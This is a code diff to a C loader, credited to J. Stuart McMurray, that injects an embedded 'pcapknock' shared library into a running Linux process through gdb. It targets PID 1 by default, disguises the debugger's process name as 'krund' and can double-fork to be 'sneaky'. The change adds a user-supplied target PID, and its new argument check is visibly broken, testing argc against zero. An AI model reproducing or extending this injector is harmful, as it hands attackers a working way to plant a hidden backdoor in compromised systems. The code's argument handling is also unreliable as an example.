@@ -3,7 +3,7 @@
  * Loader to inject pcapknock
  * By J. Stuart McMurray
  * Created 20190209
- * Last Modified 20190325
+ * Last Modified 20190326
  */
 
 #define _GNU_SOURCE
@@ -13,7 +13,9 @@
 #include <sys/wait.h>
 
 #include <err.h>
+#include <errno.h>
 #include <fcntl.h>
+#include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -23,8 +25,11 @@
 #include "gdb.h"
 #include "pcapknock.so.h"
 
-/* PID into which to shove the library */
-#define TARGETPID 1
+/* PID into which to shove the library if none was given */
+#define DEFAULTPID 1
+
+/* Process name for GDB */
+#define GDBARGV0 "krund"
 
 /* Buffer length */
 #define BUFLEN 4096
@@ -42,6 +47,25 @@ main(int argc, char **argv)
         char binpath[BUFLEN];
         int pipefd[2];
         int gdbpid;
+        long targetpid;
+        char *ep;
+        char *pidflag;
+        extern int errno;
+
+        /* Get the PID into which to inject, assume 1 */
+        if (0 == argc) {
+                errno = 0;
+                targetpid = strtol(argv[1], &ep, 10);
+                if (argv[0] == '\0' || *ep != '\0')
+                        err(16, "invalid pid");
+                if (errno == ERANGE &&
+                                (targetpid == LONG_MAX ||
+                                 targetpid == LONG_MIN))
+                        err(17, "invalid pid");
+        } else {
+                targetpid = DEFAULTPID;
+        };
+
 
 #ifdef DOUBLEFORK
         /* Double-fork from the get-go, if we're being sneaky */
@@ -99,7 +123,7 @@ main(int argc, char **argv)
         write_to_memfd(&libname, pcapknock_so, pcapknock_so_len);
 
         /* Get the path to the victim binary */
-        if (-1 == asprintf(&procpath, "/proc/%i/exe", TARGETPID))
+        if (-1 == asprintf(&procpath, "/proc/%li/exe", targetpid))
                 err(4, "asprintf");
         bzero(binpath, sizeof(binpath));
         switch (sz = readlink(procpath, binpath, sizeof(binpath)-1)) {
@@ -129,7 +153,10 @@ main(int argc, char **argv)
                         /* Read from the pipe */
                         if (-1 == dup2(pipefd[0], STDIN_FILENO))
                                 err(13, "dup2");
-                        if (-1 == execl(gdbname, "krund", "-se", binpath, "-pid=1", (char *)NULL))
+                        if (-1 == asprintf(&pidflag, "-pid=%lu", targetpid))
+                                err(18, "asprintf");
+                        if (-1 == execl(gdbname, GDBARGV0, "-se", binpath,
+                                                pidflag, (char *)NULL))
                                 err(14, "execl");
                 case -1: /* Error */
                         err(8, "fork");
